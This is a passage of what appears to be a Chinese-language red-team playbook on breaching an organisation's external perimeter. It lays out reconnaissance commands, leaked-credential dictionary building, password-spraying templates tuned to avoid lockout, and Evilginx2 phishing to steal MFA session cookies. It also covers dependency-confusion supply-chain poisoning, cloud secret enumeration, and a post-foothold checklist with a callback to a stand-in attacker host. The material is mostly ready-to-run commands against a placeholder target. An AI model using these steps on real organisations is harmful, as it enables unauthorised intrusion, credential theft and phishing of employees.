## 二、高级外网打点

### 2.1 攻击面测绘（四层法）

```
Layer 1: 域名/IP资产
  subfinder -d corp.com -all -o subs.txt
  amass enum -passive -d corp.com
  masscan -p1-65535 --rate 10000 -iL ip.txt -oL ports.txt
  nmap -sV -sC -p $(cat ports.txt | tr ',' ' ') -iL ip.txt -oA scan

Layer 2: 证书透明日志（找隐藏子域/入口）
  curl -s "https://crt.sh/?q=%25.corp.com&output=json" | jq -r '.[].name_value' | sort -u
  # owa/adfs/mail/webmail/vpn/rdweb/citrix/sslvpn 等关键词优先

Layer 3: 互联网测绘（Shodan/Censys/Fofa）
  shodan search "ssl.cert.subject.cn:corp.com" --fields ip_str,port,org
  shodan search "http.title:login country:CN org:'corp'" 
  # 找暴露的 OWA/ADFS/Exchange/VPN/RDP/数据库

Layer 4: 组织情报（钓鱼准备+口令猜测语料）
  theHarvester -d corp.com -b all
  # Hunter.io/snov.io：企业邮箱格式 (名.姓@corp.com)
  # 招聘网站：技术栈推断（Java/PHP/.NET → 对应漏洞面）
  # dehashed/haveibeenpwned：历史泄露凭据（拼凑弱口令字典）
```

### 2.2 常见外网入口利用深化

| 入口 | 攻击向量 | 要点 |
|------|---------|------|
| Web 应用 | SQLi/RCE/SSRF/文件上传/反序列化 | 参考 `sql-injection-testing`/`fastjson-exploitation` 等专项技能 |
| VPN（SSL VPN/Fortinet/Pulse） | 历史 RCE、默认口令、会话固定 | 关注厂商 CVE 公告，2024-2026 多家 VPN 出过高危 RCE |
| 邮件系统 OWA/ECP | 口令喷洒、Exchange RCE 链 | **喷洒注意锁定策略**，慢速低并发 |
| ADFS/RDWeb | 口令喷洒、ADFS 配置滥用 | `/adfs/ls/idpinitiatedsignon` 页面常被遗忘暴露 |
| RDP/VNC/SSH | 弱口令、协议漏洞 | Hydra 慢速爆破，配合 Honeypot 感知 |
| 远程运维软件 | 向日葵/Todesk/AnyDesk | 默认密码、设备码爆破、历史漏洞 |
| 云资产 | OSS 桶/S3 未授权、云凭证泄露、托管控制台 | 见 2.4 节 |

**口令喷洒模板（低噪音）：**
```bash
# 单用户单密码慢速轮询，避免锁定
crackmapexec smb vpn.corp.com -u users.txt -p 'Corp@2026!' --continue-on-success
# OWA 喷洒（模块化）
ruler --domain corp.com brute --users users.txt --passwords pass.txt --delay 30
```

### 2.3 钓鱼联动（红队标准入口）

```
准备阶段: 仿冒域名+SSL 证书（Typosquatting）、邮箱伪造 SPF/DKIM 检查
投递阶段: GoPhish 批量投递 / 宏文档 / OneNote / ISO 附件 / 恶意 LNK（注意 CVE-2026-32202 类 LNK 触发面）
捕获阶段: Evilginx2 中间人（MFA 绕过，代理真实登录流程）
联动阶段: 捕获的凭据/会话 → 直接作为内网阶段起点（Assume Breach）
```
```bash
# Evilginx2 反代仿冒登录页（捕获 OTP/会话 Cookie）
# config: phishlet 定义仿冒站点, lures 生成钓鱼链接
evilginx2 -p phishlets/ -c config.yaml
```
> **关键**：钓鱼捕获的**会话 Cookie/Token**（而非仅密码）是进入内网的最强钥匙；捕获的邮箱可继续作为**内网横向的信息源**（读邮件找 VPN 账号、资产清单、密码重置流程）。

### 2.4 供应链与云资产入口
- **供应链**：目标供应商/外包商泄露源码（GitHub 搜索 `corp.com` 关键代码/密钥）、第三方组件仓库投毒（npm/PyPI 依赖混淆）、外包系统成为跳板
- **云资产**：
  ```bash
  # 云存储桶枚举（OSS/S3 未授权读写 → WebShell/泄露文件）
  cloud_enum -k corp.com --disable-aws
  # 云凭证泄露（Github 搜索）
  trufflehog github --org=corp --only-verified
  # 托管数据库/Redis/ES 未授权（云上常见）
  ```
- **GitHub 泄露扫描**：`gitdorker`/`trufflehog` 找 `corp` 相关仓库中的 API Key、`corp.com` 内部域名、`.env`、VPN 配置
- **历史漏洞利用思路**：OA/ERP/门户系统（泛微/致远/用友/蓝凌等）历史 RCE 批量检测，与 `spring-exploitation`/`shiro-exploitation`/`log4shell-exploitation` 专项技能联动

### 2.5 打点后的第一滴血（Foothold Checklist）
```bash
# 1. 回连验证（确认出网能力与方向）
curl -x http://127.0.0.1:8080 http://attacker:8000/ping  # 经代理验证
# 2. 权限基线（whoami/systeminfo/网络位置）
whoami; systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all; route print; arp -a
# 3. 判断是否入域（决定后续走域渗透 or 本机深耕）
echo %USERDOMAIN% | findstr /V %COMPUTERNAME%
# 4. 落地隧道（参考第三章）建立持久可控通道
# 5. 同步触发 intranet-penetration-testing 技能的本地信息收集清单
```

